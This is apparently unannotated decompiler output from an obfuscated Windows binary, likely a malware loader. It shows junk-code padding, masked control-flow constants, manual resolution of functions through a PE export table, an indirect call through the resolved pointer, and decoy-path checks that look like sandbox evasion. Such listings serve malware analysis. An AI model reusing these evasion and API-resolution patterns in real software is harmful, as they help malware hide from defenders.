// 405838: variable 'Msg' is possibly undefined
// 405838: variable 'wParam' is possibly undefined
// 405838: variable 'lParam' is possibly undefined
// 408222: using guessed type int dword_408222;

//----- (0040586D) --------------------------------------------------------
int __userpurge sub_40586D@<eax>(char a1@<al>, unsigned __int8 a2)
{
  bool v2; // zf
  int v3; // eax
  unsigned int v5; // [esp+0h] [ebp-Ch]

  v2 = a1 == (char)a2;
  v3 = -4099;
  if ( v2 )
  {
    v5 = 0;
    do
    {
      if ( ++v5 == 27 )
        GetLastError();
    }
    while ( v5 < 0x13 );
    v3 = -4100;
  }
  return (v3 ^ 0x352F) + 9518;
}

//----- (004058D0) --------------------------------------------------------
int __userpurge sub_4058D0@<eax>(
        int a1@<edi>,
        int *a2@<esi>,
        _DWORD *a3,
        unsigned int *a4,
        _DWORD *a5,
        _DWORD *a6,
        _DWORD *a7,
        _DWORD *a8,
        _DWORD *a9,
        unsigned int *a10)
{
  unsigned int i; // ebx
  int v11; // eax
  unsigned int v12; // ecx
  unsigned int v13; // eax
  unsigned int *v14; // ecx
  int v15; // eax
  int v16; // eax
  int result; // eax
  int v18; // [esp+0h] [ebp-6Ch]
  int v19; // [esp+Ch] [ebp-60h]
  char v20; // [esp+20h] [ebp-4Ch]
  char v21; // [esp+24h] [ebp-48h]
  unsigned int k; // [esp+44h] [ebp-28h]
  unsigned int j; // [esp+58h] [ebp-14h]

  for ( i = -4099; i != -4147; i = ((i ^ 0x352F) + 1) ^ 0x352F )
  {
    for ( j = 0; j < 0x15; ++j )
      ;
    if ( i % 0x43 == 118 || i == -4104 )
    {
      v19 &= v18;
      v16 = *(_DWORD *)(*a2 + 32);
      *a3 = a1 + *(_DWORD *)(*a2 + 28);
      v14 = a4;
      v13 = a1 + v16;
LABEL_22:
      *v14 = v13;
      goto LABEL_23;
    }
    v21 += v20 + (dword_408262 < i % 0x43);
    if ( i % 0x76 >= 0x98 || i == -4102 )
    {
      for ( k = 0; k < 0x1C; ++k )
        ;
      v21 = 0;
      v15 = a1 + *(_DWORD *)(a1 + 60);
      *a5 = v15;
      *a2 = a1 + *(_DWORD *)(v15 + 120);
    }
    else
    {
      if ( i % 0x65 > 0x896 || i == -4108 )
      {
        *a6 = -4103;
        *a7 = -4103;
        *a8 = -4101;
        goto LABEL_23;
      }
      if ( i % 0x87 == 259 || i == -4106 )
      {
        v11 = *a2;
        *a9 = a1 + *(_DWORD *)(*a2 + 36);
        v12 = *(_DWORD *)(v11 + 20);
        v13 = *(_DWORD *)(v11 + 24);
        if ( v12 > v13 )
          v13 = v12;
        v14 = a10;
        goto LABEL_22;
      }
    }
LABEL_23:
    result = 13615;
  }
  return result;
}
// 405907: conditional instruction was optimized away because %var_14.4<15u
// 405A4E: conditional instruction was optimized away because %var_28.4<1Cu
// 405970: variable 'v20' is possibly undefined
// 40596E: variable 'v21' is possibly undefined
// 405A9E: variable 'v18' is possibly undefined
// 405A9E: variable 'v19' is possibly undefined
// 408262: using guessed type int dword_408262;
// 408564: using guessed type wchar_t aBqqMt00N27iwy6[19];

//----- (00405ACE) --------------------------------------------------------
int __userpurge start@<eax>(int a1@<ebx>, int a2)
{
  unsigned int v3; // ecx
  WCHAR v4; // ax
  WCHAR v5; // cx
  WCHAR v6; // dx
  unsigned int v7; // [esp+FCh] [ebp-308h]
  unsigned int v8; // [esp+108h] [ebp-2FCh]
  unsigned int v9; // [esp+118h] [ebp-2ECh]
  __int64 v10; // [esp+11Ch] [ebp-2E8h] BYREF
  int v11; // [esp+128h] [ebp-2DCh]
  int v12; // [esp+138h] [ebp-2CCh]
  int v13; // [esp+13Ch] [ebp-2C8h]
  unsigned __int8 v14; // [esp+154h] [ebp-2B0h]
  int v15; // [esp+15Ch] [ebp-2A8h]
  int v16; // [esp+16Ch] [ebp-298h]
  _DWORD v17[8]; // [esp+17Ch] [ebp-288h]
  int v18; // [esp+1A0h] [ebp-264h]
  int v19; // [esp+1A4h] [ebp-260h]
  int v20; // [esp+1B8h] [ebp-24Ch]
  int v21; // [esp+1E0h] [ebp-224h]
  unsigned int i; // [esp+1E8h] [ebp-21Ch]
  WCHAR pszPath[260]; // [esp+1ECh] [ebp-218h] BYREF
  DWORD nNumberOfArguments; // [esp+3F4h] [ebp-10h] BYREF
  char v25[4]; // [esp+3F8h] [ebp-Ch] BYREF
  unsigned int v26; // [esp+3FCh] [ebp-8h] BYREF
  void **v27; // [esp+400h] [ebp-4h] BYREF
  int savedregs; // [esp+404h] [ebp+0h] BYREF
  void *retaddr; // [esp+408h] [ebp+4h] BYREF

  if ( StrSpnA(psz, pszSet) > 10 )
    return 0;
  for ( i = 0; i < 0x15; ++i )
    ;
  sub_404075((int)&savedregs, 0xFFFFEFFD, &nNumberOfArguments);
  v21 = 101648166;
  HIDWORD(v10) = (__PAIR64__(HIDWORD(v10), v7) - __PAIR64__(v9, v3)) >> 32;
  pszPath[0] = 70;
  pszPath[1] = 58;
  v11 -= (int)&v10 + 4;
  pszPath[2] = 92;
  pszPath[3] = 92;
  v4 = 74;
  v13 ^= 0x21D9u;
  pszPath[4] = 74;
  v5 = 72;
  pszPath[5] = 72;
  dword_408286 |= 0x132Eu;
  pszPath[6] = 68;
  v6 = 75;
  pszPath[7] = 75;
  pszPath[8] = 74;
  dword_4082C2 |= v14;
  pszPath[9] = 72;
  pszPath[10] = 74;
  dword_4082B6 = (unsigned int)dword_4082B6 >> 11;
  pszPath[11] = 75;
  pszPath[14] = 92;
  pszPath[12] = 72;
  dword_408292 += (int)&dword_408252 + (v8 > 0x4A);
  pszPath[15] = 68;
  pszPath[16] = 74;
  pszPath[21] = 74;
  pszPath[17] = 75;
  for ( dword_408276 = 27; dword_408276; --dword_408276 )
  {
    if ( dword_408276 == 43 )
      RaiseException(*(DWORD *)&pszPath[254], 0x4923u, nNumberOfArguments, (const ULONG_PTR *)0x4D9E);
  }
  v19 = 28;
  pszPath[23] = 46;
  pszPath[24] = 68;
  pszPath[25] = 76;
  pszPath[26] = 76;
  memset(&pszPath[27], 0, 466);
  pszPath[18] = v4;
  pszPath[13] = 92;
  pszPath[19] = v5;
  pszPath[20] = v6;
  pszPath[22] = v5;
  dword_40829A += (int)&dword_408242;
  dword_40829A ^= (unsigned int)&tm.tmAscent;
  dword_40829A += (int)&dword_40824E;
  if ( PathMakePrettyW(pszPath) )
  {
    sub_40411A((int)&savedregs, (unsigned int)v25, (LONG *)&v26);
    v13 -= v12;
    sub_40411A((int)&savedregs, 0, &dword_407548);
    sub_404075((int)&savedregs, 0, (unsigned int *)&dword_40754C);
    v17[1] |= v17[0];
    sub_40411A((int)&savedregs, 0, &dword_407550);
    sub_40411A((int)&savedregs, 0, &dword_407554);
  }
  v27 = &retaddr;
  sub_40411A((int)&savedregs, 0x6586476u, (LONG *)&v27);
  for ( dword_40826E = 0; (unsigned int)dword_40826E < 0x17; ++dword_40826E )
  {
    if ( dword_40826E == 35 )
      IsWindow(*(HWND *)&pszPath[250]);
  }
  v27 = (void **)&savedregs;
  v20 ^= *off_408375[0];
  sub_406CB6(&savedregs);
  sub_40411A((int)&savedregs, dword_407548, &dword_4074CC);
  sub_404075((int)&savedregs, dword_40754C, (unsigned int *)&dword_4074D0);
  v18 = 37106;
  sub_40411A((int)&savedregs, dword_407550, (LONG *)&unk_4074D4);
  sub_40411A((int)&savedregs, v26, &dword_4074D8);
  if ( GetCurrentProcessId() )
  {
    sub_404F90();
  }
  else if ( GetCurrentThreadId() )
  {
    ExitProcess(0);
  }
  if ( a1 > 3450 )
    v16 = dword_408226 | (unsigned __int16)v16;
  *(_DWORD *)v26 = *(_DWORD *)dword_4074D8;
  v15 += 26360;
  dword_407100 ^= dword_407104;
  *(_DWORD *)dword_407554 += dword_407100;
  return *(_DWORD *)v26;
}
// 405B34: conditional instruction was optimized away because %var_21C.4<15u
// 405B9F: variable 'v7' is possibly undefined
// 405B9F: variable 'v3' is possibly undefined
// 405B9F: variable 'v9' is possibly undefined
// 405CB3: variable 'v8' is possibly undefined
// 405DDD: variable 'v4' is possibly undefined
// 405DF4: variable 'v5' is possibly undefined
// 405DFB: variable 'v6' is possibly undefined
// 407100: using guessed type int dword_407100;
// 407104: using guessed type int dword_407104;
// 4074CC: using guessed type int dword_4074CC;
// 4074D0: using guessed type int dword_4074D0;
// 4074D8: using guessed type int dword_4074D8;
// 407548: using guessed type int dword_407548;
// 40754C: using guessed type int dword_40754C;
// 407550: using guessed type int dword_407550;
// 407554: using guessed type int dword_407554;
// 408226: using guessed type int dword_408226;
// 408242: using guessed type int dword_408242;
// 40824E: using guessed type int dword_40824E;
// 408252: using guessed type int dword_408252;
// 40826E: using guessed type int dword_40826E;
// 408276: using guessed type int dword_408276;
// 408286: using guessed type int dword_408286;
// 408292: using guessed type int dword_408292;
// 40829A: using guessed type int dword_40829A;
// 4082B2: using guessed type int dword_4082B2;
// 4082B6: using guessed type int dword_4082B6;
// 4082BA: using guessed type int dword_4082BA;
// 4082C2: using guessed type int dword_4082C2;
// 4082F5: using guessed type int *off_4082F5[4];
// 408375: using guessed type int *off_408375[14];
// 405ACE: using guessed type char var_C[4];

//----- (00406044) --------------------------------------------------------
void __userpurge kfxr_ex__kbfj__(unsigned int a1@<edi>, int a2, unsigned int *a3)
{
  unsigned int v3; // [esp+4h] [ebp-1Ch]

  dword_408262 = (unsigned __int8)(dword_408272 & dword_408262);
  dword_40827A = *off_40837D[0] | (unsigned __int16)dword_40827A;
  *(_DWORD *)off_408371 = (__PAIR64__(*(_DWORD *)off_408371, a1) - __PAIR64__(dword_4082C6, v3)) >> 32;
}
// 406083: variable 'v3' is possibly undefined
// 408262: using guessed type int dword_408262;
// 408272: using guessed type int dword_408272;
// 40827A: using guessed type int dword_40827A;
// 4082C6: using guessed type int dword_4082C6;
// 408371: using guessed type void *off_408371;
// 40837D: using guessed type int *off_40837D[12];

//----- (0040680C) --------------------------------------------------------
int __cdecl sub_40680C(char *a1, int a2, int a3, unsigned int a4)
{
  unsigned int v4; // ecx
  int v5; // edx
  unsigned int v6; // edx
  int v7; // ecx
  int v8; // eax
  int v9; // esi
  HWND TempPathA; // eax
  bool v11; // cf
  unsigned int v12; // ecx
  unsigned int *v13; // eax
  int v15; // [esp-8h] [ebp-278h]
  int *v16; // [esp-4h] [ebp-274h]
  _DWORD v17[44]; // [esp+0h] [ebp-270h] BYREF
  int v18; // [esp+B0h] [ebp-1C0h]
  int v19; // [esp+CCh] [ebp-1A4h]
  int v20; // [esp+F8h] [ebp-178h]
  int v21; // [esp+104h] [ebp-16Ch]
  unsigned int v22; // [esp+118h] [ebp-158h]
  int v23; // [esp+130h] [ebp-140h]
  int v24; // [esp+160h] [ebp-110h]
  int v25; // [esp+16Ch] [ebp-104h]
  int v26; // [esp+184h] [ebp-ECh]
  int v27; // [esp+194h] [ebp-DCh]
  int v28; // [esp+19Ch] [ebp-D4h]
  unsigned int v29; // [esp+1B4h] [ebp-BCh]
  int v30; // [esp+200h] [ebp-70h]
  int v31; // [esp+208h] [ebp-68h]
  int j; // [esp+20Ch] [ebp-64h]
  int *v33; // [esp+210h] [ebp-60h]
  int *v34; // [esp+214h] [ebp-5Ch]
  int *v35; // [esp+218h] [ebp-58h]
  int *v36; // [esp+21Ch] [ebp-54h]
  int v37; // [esp+220h] [ebp-50h] BYREF
  int v38; // [esp+224h] [ebp-4Ch] BYREF
  int v39; // [esp+228h] [ebp-48h] BYREF
  int v40; // [esp+22Ch] [ebp-44h] BYREF
  unsigned int v41; // [esp+230h] [ebp-40h] BYREF
  int v42; // [esp+234h] [ebp-3Ch] BYREF
  int (__thiscall *v43)(int); // [esp+238h] [ebp-38h]
  unsigned int v44; // [esp+23Ch] [ebp-34h] BYREF
  int v45; // [esp+240h] [ebp-30h] BYREF
  unsigned int v46; // [esp+244h] [ebp-2Ch] BYREF
  int v47; // [esp+248h] [ebp-28h] BYREF
  int v48; // [esp+24Ch] [ebp-24h] BYREF
  int v49; // [esp+250h] [ebp-20h] BYREF
  int v50; // [esp+254h] [ebp-1Ch] BYREF
  int v51; // [esp+258h] [ebp-18h]
  int v52; // [esp+25Ch] [ebp-14h]
  HWND hWnd; // [esp+260h] [ebp-10h]
  int i; // [esp+264h] [ebp-Ch]
  _DWORD *v55; // [esp+268h] [ebp-8h]
  int v56; // [esp+26Ch] [ebp-4h] BYREF
  int savedregs; // [esp+270h] [ebp+0h] BYREF
  char *v58; // [esp+278h] [ebp+8h]

  v37 = 11015;
  v38 = 30006;
  v39 = 549991;
  v40 = 18023;
  v33 = &v37;
  v34 = &v38;
  v35 = &v39;
  v36 = &v40;
  v52 = -4100;
  v51 = -4099;
  for ( i = -4099; ; i = ((i ^ 0x352F) + 1) ^ 0x352F )
  {
    if ( v51 == -4099 )
    {
      for ( dword_40826E = 28; dword_40826E; --dword_40826E )
      {
        if ( dword_40826E == 32 )
          GetWindow(hWnd, 0x471Bu);
      }
      sub_4058D0(a2, &v50, &v42, &v44, &v41, &v47, &v48, &v45, &v49, &v46);
    }
    if ( v48 != -4099 )
    {
      tm.tmInternalLeading = (LONG)&dword_4081CE;
      if ( !*(_DWORD *)(v50 + 24) || !*(_DWORD *)(v50 + 20) )
      {
        v52 = -4099;
        goto LABEL_26;
      }
    }
    if ( v47 == -4099 )
      return 0;
    v28 = 32766;
    if ( i == ((v46 - 9518) ^ 0x352F) || v52 != -4100 )
      return 0;
    v4 = (i ^ 0x352F) + 9518;
    if ( v4 >= 5 )
      v51 = -4100;
    for ( j = 30; j; --j )
    {
      if ( j == 33 )
        EnableScrollBar((HWND)0x8202, 0x7BF0u, 0x2BF4u);
    }
    v58 = a1 + 30010;
    if ( v4 >= *(_DWORD *)(v50 + 24) )
      return 0;
    v21 -= v20;
    v30 = dword_408222 + (unsigned __int8)v30;
    if ( *(unsigned __int16 *)(v49 + 2 * v4) > (unsigned int)(*(_DWORD *)(v50 + 20) - 1) )
      return 0;
    a1 = v58 - 30010;
    v56 = 0;
    dword_40824A = v25 | (unsigned __int16)dword_40824A;
    v43 = (int (__thiscall *)(int))*(unsigned __int16 *)(v4 * ((v45 ^ 0x352F) + 9518) + v49);
    v16 = &v56;
    v5 = (v48 ^ 0x352F) + 9518;
    tm.tmAscent = (__PAIR64__(tm.tmAscent, v5) - __PAIR64__(*off_40838D[0], v22)) >> 32;
    v15 = a2 + *(_DWORD *)(v4 * v5 + v44);
    *off_4083AD[0] |= 0x2Eu;
    ((void (__stdcall *)(int, int, int *))a1)(a3, v15, v16);
    if ( v56 == 1 )
      break;
LABEL_26:
    v26 = 229062992;
  }
  dword_4082B6 = v23 + (unsigned __int16)dword_4082B6;
  v7 = v42;
  v8 = *(_DWORD *)(v42 + 4 * (_DWORD)v43);
  tm.tmInternalLeading = (unsigned int)&dword_40825A & (&unk_408236 - (_UNKNOWN *)&dword_40823E);
  v43 = (int (__thiscall *)(int))(a2 + v8);
  v55 = 0;
  if ( a4 )
  {
    *off_4083D5[0] = (__PAIR64__(*off_4083D5[0], 13615) - __PAIR64__((unsigned __int16)v26, &savedregs)) >> 32;
    hWnd = 0;
    v9 = (v47 ^ 0x352F) + 9518;
    v24 &= 0xC6u;
    v41 = a4 * v9;
    *off_4083E5[0] &= v19;
    v55 = v17;
    TempPathA = (HWND)v17;
    v11 = (unsigned __int64)((int)a4 * (__int64)v9) >> 32 != 0;
    v12 = a4 * v9;
    do
    {
      dword_4082A6 -= (int)&tm.tmDigitizedAspectX + v11;
      TempPathA = (HWND)((char *)TempPathA - 1);
      --v12;
      v11 = 0;
    }
    while ( v12 );
    v29 = 0;
    do
    {
      if ( ++v29 == 40 )
        TempPathA = (HWND)GetTempPathA(0x697Cu, aScw7Sw5u);
    }
    while ( v29 < 0x1B );
    hWnd = TempPathA;
    v27 = 5;
    v6 = a4;
    v7 = 0;
    v13 = &a4;
    do
    {
      dword_408242 = v23 + (dword_408256 < (unsigned int)v9) + (unsigned __int8)dword_408242;
      ++v13;
      v31 = ~v31;
      *(_DWORD *)((char *)hWnd + v7) = *v13;
      v7 += v9;
      --v6;
    }
    while ( v6 );
  }
  else
  {
    v55 = 0;
  }
  v18 += dword_4081CA + (v17[29] < v6);
  return v43(v7);
}
// 4069EA: variable 'v4' is possibly undefined
// 406C90: variable 'v6' is possibly undefined
// 4081CA: using guessed type int dword_4081CA;
// 4081CE: using guessed type int dword_4081CE;
// 408222: using guessed type int dword_408222;
// 40823E: using guessed type int dword_40823E;
// 408242: using guessed type int dword_408242;
// 40824A: using guessed type int dword_40824A;
// 408256: using guessed type int dword_408256;
// 40825A: using guessed type int dword_40825A;
// 40826E: using guessed type int dword_40826E;
// 4082A6: using guessed type int dword_4082A6;
// 4082B6: using guessed type int dword_4082B6;
// 40838D: using guessed type int *off_40838D[8];
// 4083AD: using guessed type char *off_4083AD[18];
// 4083D5: using guessed type int *off_4083D5[8];
// 4083DD: using guessed type int *off_4083DD[6];
// 4083E5: using guessed type int *off_4083E5[4];

//----- (00406CB6) --------------------------------------------------------
int __usercall sub_406CB6@<eax>(_DWORD *a1@<eax>)
{
  int result; // eax

  dword_407554 = (int)(a1 + 1);
  dword_407548 = a1[2];
  dword_40754C = a1[3];
  result = a1[4];
  dword_407550 = result;
  return result;
}
// 407548: using guessed type int dword_407548;
// 40754C: using guessed type int dword_40754C;
// 407550: using guessed type int dword_407550;
// 407554: using guessed type int dword_407554;

//----- (00406CDA) --------------------------------------------------------
void __fastcall VoOZMHYX_V(unsigned int a1, int a2, __int16 a3, double *a4)
{
  unsigned int v4; // [esp+4h] [ebp-28h]

  dword_4082BA = *(_DWORD *)off_408339 + (v4 < a1) + (unsigned __int16)dword_4082BA;
  *off_4083E9[0] &= tm.tmDigitizedAspectX;
  dword_408292 ^= *off_4083A1[0];
}
// 406CE0: variable 'v4' is possibly undefined
// 408292: using guessed type int dword_408292;
// 4082BA: using guessed type int dword_4082BA;
// 408339: using guessed type void *off_408339;
// 4083A1: using guessed type int *off_4083A1[3];
// 4083E9: using guessed type int *off_4083E9[3];

//----- (00406D1E) --------------------------------------------------------
void __userpurge JDZRizjr_hUWUGA_IAylml(unsigned int a1@<ecx>, unsigned int a2@<ebx>, unsigned __int8 *a3, char a4)
{
  int v4; // [esp+0h] [ebp-28h] BYREF

  dword_40825A += *(_DWORD *)off_408331 + (a2 < dword_40824E);
  tm.tmDigitizedAspectX = (__PAIR64__(tm.tmDigitizedAspectX, a1) - __PAIR64__((unsigned __int8)dword_408292, &v4)) >> 32;
  *off_4083D5[0] -= (unsigned __int16)dword_408222;
}
// 408222: using guessed type int dword_408222;
// 40824E: using guessed type int dword_40824E;
// 40825A: using guessed type int dword_40825A;
// 408292: using guessed type int dword_408292;
// 4082BE: using guessed type int dword_4082BE;
// 408331: using guessed type void *off_408331;
// 4083D5: using guessed type int *off_4083D5[8];

// nfuncs=35 queued=34 decompiled=34 lumina nreq=0 worse=0 better=0
#error "There were 1 decompilation failure(s) on 34 function(s)"
